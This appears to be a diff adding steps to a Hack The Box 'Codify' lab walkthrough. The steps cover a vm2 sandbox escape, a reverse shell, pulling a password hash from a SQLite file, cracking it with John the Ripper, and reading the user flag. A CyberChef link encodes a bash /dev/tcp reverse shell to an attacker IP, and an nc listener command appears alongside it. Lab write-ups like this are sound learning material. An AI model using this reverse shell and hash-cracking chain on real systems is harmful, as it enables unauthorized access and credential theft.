@@ -77,3 +77,35 @@ try {
 console.log(vm.run(code));
 ```
 ![alt text](../Images/PoC_vm2-escape.png)
+
+Task 6: There is a second NodeJS application on Codify that isn't running. What is the name of the SQLite database file used by this application?
+
+- tickets.db
+
+1. In Linux, web directories are located in directories such as /var/www/
+2. I dug around and found SQlite database file under /var/www/contact
+
+![alt text](../Images/Codify_task6.png)
+
+Task 7: What is the joshua user's password on Codify?
+
+1. Found a better PoC at https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244
+2. Used https://www.revshells.com/ to create a bash -i reverse shell
+3. Used Cyberchef to input my reverse shell and turn it to Base64. https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzkvODA4MCAwPiYx
+4. Performed ```nc -lvnp 8080``` on kali linux listening for my reverse shell
+5. Placed my reverse shell script into PoC script in editor
+![HackTheBox-Labs/Images/Codify_task7.png](../Images/Codify_task7.png)
+6. Got access through my reverse shell
+![alt text](../Images/Codify_task7_NC.png)
+7. Found hash using cat /var/www/contact/tickets.db
+![alt text](../Images/Codify_task7-hash.png)
+8. Created file called hash on Kali Linux and placed hash value in there
+9. Ran John the Ripper to crack the hash and obtain the password 
+``` john --wordlist=/usr/share/wordlists/rockyou.txt hash```
+
+Task 8: Submit the flag located in the joshua user's home directory.
+
+1. Logged into Joshua with the cracked hash
+2. Went to /home/joshua
+3. ls and cat user.txt for flag
+![alt text](../Images/Codify_task8.png)
